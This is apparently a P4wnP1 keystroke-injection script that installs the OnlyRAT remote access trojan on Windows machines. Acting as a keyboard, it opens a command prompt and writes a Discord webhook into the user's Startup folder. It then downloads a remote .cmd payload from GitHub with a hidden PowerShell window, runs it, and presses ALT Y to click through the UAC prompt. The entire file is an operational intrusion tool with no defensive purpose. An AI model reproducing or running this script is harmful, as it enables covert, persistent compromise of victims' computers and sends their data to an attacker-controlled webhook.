/*########################################################################################################\
#  onlyRAT.js														                                                                  #
#  OnlyRAT installer rewritten for p4wnp1 (https://github.com/CosmodiumCS/OnlyRAT)   									    #
#  Author: cosmodiumCS                                                                                    #
#  Edit: chriskalv                                                                                        #
#													                                                                                #
# PREREQUISTES:                                                                                           #
# - Enable keyboard capability on your P4wnP1.                                                            #
# - Edit global settings below.                                                                           #
#########################################################################################################*/


////////////////////////// GLOBAL SETTINGS ////////////////////////\
layout("de");			                                                // Keyboard layout
typingSpeed(0,0);		                                              // Typing = really fast
run_as_admin=false;					                                      // Set to true to execute powershell as Administrator (normally not necessary)
exit=true;			                                                  // Set to true to exit the console once finished
var usb_drive = "TEMPUSB"                                         // The name of the P4wnP1's USB storage device
var webhook = "YOURHOOK"                                          // Your Discord Webhook
///////////////////////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                                                // The time to wait before executing the attack in seconds
var ready = "False"                                               // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                          // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                               // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                      // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                       // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(800);
    type("cmd");
    if (run_as_admin) {							                              // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
	    delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    }
    else {
        type("\n");
        delay(1000);
    }
  // Install Discord Webhook
    type("set 'YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'");
    type("\n");
    type("cd %YKHfpmMRoQ%");
    type("echo " + webhook + " > lawFvVTikZ.txt");
    type("\n");
    type("powershell powershell.exe -windowstyle hidden 'Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/dw1.cmd -OutFile wEaoFkNduy.cmd'");
    type("\n");
    delay(300);
    type("powershell ./wEaoFkNduy.cmd && exit");
 
  // UAC Bypass
    delay(200);
    press("ALT Y");
}

delay(delay_time * 100);
check_if_ready();
attack();
